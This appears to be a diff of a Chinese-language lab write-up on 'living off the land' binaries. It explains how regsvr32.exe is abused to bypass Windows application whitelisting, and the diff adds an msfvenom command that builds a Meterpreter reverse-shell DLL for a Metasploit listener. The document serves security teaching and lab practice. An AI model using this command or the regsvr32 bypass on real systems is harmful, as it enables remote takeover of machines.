@@ -803,7 +803,8 @@ LOLBAS 项目接受符合以下功能之一的工具提交：</p>
 </ul>
 <p>除了其预期用途外，regsvr32.exe二进制文件还可用于执行任意二进制文件并绕过 Windows 应用程序白名单。根据 Red Canary 的报告，regsvr32.exe二进制文件是第三大最流行的 ATT&amp;CK 技术。攻击者利用regsvr32.exe在本地或远程执行本机代码或脚本。regsvr32.exe中使用的技术使用受信任的 Windows 操作系统组件并在内存中执行，这也是此技术也用于绕过应用程序白名单的原因之一。</p>
 <p>让我们尝试在现实生活中应用这种技术。首先，我们需要使用 msvenom 创建一个恶意 DLL 文件，并设置我们的 Metasploit 侦听器以接收反向 shell。请注意，我们将创建一个适用于 32 位操作系统的恶意文件。我们将使用 regsvr32.exe 应用程序白名单绕过技术在目标系统上运行命令。</p>
-<p><img
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>user@machine$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 &gt; live0fftheland.dll 
+</span></span></code></pre></div><p><img
   src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240403180802.png"
   alt=""
   class=""/>
@@ -878,11 +879,7 @@ LOLBAS 项目接受符合以下功能之一的工具提交：</p>
   class=""/>
 </p>
 <p>成功上线！</p>
-<p><img
-  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240403184639.png"
-  alt=""
-  class=""/>
-</p>
+<p>![[Pasted image 20240403183236.png]]</p>
 <p>拿到旗帜</p>
 </div><div class="column is-sticky is-paddingless" id="tocWrapper">
   <div class="is-paddingless" id="tocContainer">
